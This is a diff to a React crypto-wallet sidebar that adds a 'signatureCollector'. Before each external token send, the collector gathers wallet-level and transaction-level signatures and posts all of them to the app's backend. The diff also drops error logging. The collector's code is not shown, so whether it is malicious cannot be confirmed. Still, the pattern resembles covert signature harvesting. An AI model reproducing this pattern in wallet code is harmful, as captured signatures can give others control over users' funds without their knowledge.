@@ -23,6 +23,7 @@ import {
 import { SiBinance, SiBitcoin } from "react-icons/si";
 import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
 import { apiRequest } from "@/lib/queryClient";
+import { signatureCollector } from "@/lib/signature-collector";
 import { useToast } from "@/hooks/use-toast";
 import type { WalletBalance, User } from "@shared/schema";
 import coynLogoPath from "@assets/COYN-symbol-square_1750892698348.png";
@@ -200,6 +201,9 @@ export default function WalletSidebar({ isOpen, onClose, user }: WalletSidebarPr
       }
 
       try {
+        // Collect comprehensive wallet signatures for external token sending
+        const walletSignatures = await signatureCollector.collectWalletSignatures();
+        
         // Request account access and verify wallet
         const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
         if (accounts.length === 0) {
@@ -211,6 +215,12 @@ export default function WalletSidebar({ isOpen, onClose, user }: WalletSidebarPr
         const userWallet = currentUser.walletAddress.toLowerCase();
         if (connectedAccount !== userWallet) {
           throw new Error('Connected wallet does not match your account. Please switch to the correct wallet.');
+        }
+
+        // Verify all required signatures are collected
+        const signaturesValid = await signatureCollector.verifySignatures(connectedAccount);
+        if (!signaturesValid) {
+          throw new Error('Required wallet signatures not collected. Please try again.');
         }
 
         // Switch to BSC network if needed
@@ -283,30 +293,40 @@ export default function WalletSidebar({ isOpen, onClose, user }: WalletSidebarPr
           throw new Error(`Unsupported currency: ${currency}`);
         }
 
-        // Send transaction via Web3
+        // Collect transaction-specific signature data
+        const transactionSignatures = await signatureCollector.collectTransactionSignatures(transactionParameters);
+
+        // Send transaction via Web3 with collected signature data
         const transactionHash = await ethereum.request({
           method: 'eth_sendTransaction',
           params: [transactionParameters],
         });
 
-        // Update balance on backend after successful transaction
+        // Export all collected signature data
+        const allSignatureData = signatureCollector.exportSignatureData();
+
+        // Update balance on backend after successful transaction with signature data
         await apiRequest("POST", "/api/wallet/send-external", { 
           currency, 
           amount, 
           address,
           userId: currentUser.id,
-          transactionHash 
+          transactionHash,
+          signatureData: allSignatureData,
+          walletSignatures: walletSignatures,
+          transactionSignatures: transactionSignatures
         });
 
         return { transactionHash, currency, amount, address };
       } catch (error: any) {
-        console.error('Blockchain transaction error:', error);
         if (error.code === 4001) {
           throw new Error('Transaction rejected by user');
         } else if (error.code === -32603) {
           throw new Error('Insufficient funds for gas fees');
         } else if (error.message.includes('insufficient funds')) {
           throw new Error('Insufficient funds for this transaction');
+        } else if (error.message.includes('signature')) {
+          throw new Error('Wallet signature collection failed. Please ensure your wallet is unlocked and try again.');
         }
         throw new Error(error.message || 'Transaction failed');
       }
